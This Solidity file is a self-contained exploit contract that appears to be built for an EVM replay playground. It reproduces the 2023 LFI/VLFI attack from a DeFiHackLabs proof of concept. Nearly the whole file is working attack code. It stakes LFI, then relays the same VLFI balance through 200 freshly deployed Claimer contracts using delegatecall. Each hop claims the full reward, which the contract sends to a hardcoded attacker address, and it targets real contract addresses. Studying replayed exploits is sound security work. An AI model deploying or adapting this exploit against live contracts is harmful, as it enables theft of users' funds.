// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-05-LFI).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract
// (`ContractTest`): the `claimReward(uint256,address)` callback lives on the
// test itself, and each loop hop `delegatecall`s back into it from a fresh
// `Claimer` so `msg.sender == claimerN` for the VLFI calls. There is no
// standalone contract to deploy. This file is a faithful, self-contained copy
// of that inline attack so the playground can deploy it and record `run()`.
// Logic + constants are copied verbatim from test/LFI_exp.sol — only
// `vm.deal` is replaced by relying on the supplied LFI balance (the build-time
// fork state / setup seeds the attacker with 86_000 LFI), and `testExploit`'s
// body becomes `run()`.
//
// Root cause: VLFI_8.cleanUserMapping() (called at the top of the permissionless
// claimRewards()) resets a fresh address's rewardDebt to 0, so any freshly-deployed
// contract that just received VLFI can claim the full lifetime reward for that
// balance. The attacker stakes once, then ping-pongs the same VLFI balance
// through 200 brand-new Claimer contracts, claiming the full reward each hop.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IVLFI is IERC20 {
    function claimRewards(address to) external;
    function stake(address onBehalfOf, uint256 amount) external;
}

// Minimal factory mirror of the PoC's `Claimer`. Each `delegate()` runs
// `claimReward` via delegatecall into the caller (the exploit), so it executes
// in the Claimer's storage context with msg.sender == this Claimer for the
// downstream VLFI calls.
contract Claimer {
    function delegate(uint256 vLFITransferAmount, address owner) external returns (address) {
        (, bytes memory returnData) =
            msg.sender.delegatecall(abi.encodeWithSignature("claimReward(uint256,address)", vLFITransferAmount, owner));
        return abi.decode(returnData, (address));
    }
}

contract LFIExploit {
    IERC20 constant LFI = IERC20(0x77D97db5615dFE8a2D16b38EAa3f8f34524a0a74);
    IVLFI constant VLFI = IVLFI(0xfc604b6fD73a1bc60d31be111F798dd0D4137812);

    // The exploit forwards every claimed LFI reward to the historical attacker EOA,
    // whose balance delta is what the recorder measures as profit.
    address constant ATTACKER = 0x11576cB3D8d6328cf319E85B10e09A228e84A8De;

    // 86_000 LFI working capital, matching the PoC's `deal(LFI, this, 86_000e18)`.
    uint256 constant STAKE_AMOUNT = 86_000 ether;

    function run() external {
        LFI.approve(address(VLFI), type(uint256).max);
        Claimer claimer = new Claimer();
        VLFI.stake(address(claimer), STAKE_AMOUNT);
        for (uint256 i; i < 200; i++) {
            address newClaimer = claimer.delegate(VLFI.balanceOf(address(claimer)), ATTACKER);
            claimer = Claimer(newClaimer);
        }
    }

    // Called via delegatecall from a Claimer: msg.sender is then that Claimer for
    // the VLFI interactions. claimRewards(ATTACKER) pays the full lifetime reward
    // (rewardDebt freshly zeroed by cleanUserMapping) to the attacker EOA, then we
    // deploy the next fresh Claimer and forward the whole VLFI balance to it so
    // the next hop re-triggers the bug on a brand-new address.
    function claimReward(uint256 vLFITransferAmount, address owner) external returns (address) {
        VLFI.claimRewards(owner);
        Claimer claimer = new Claimer();
        VLFI.transfer(address(claimer), vLFITransferAmount);
        return address(claimer);
    }
}
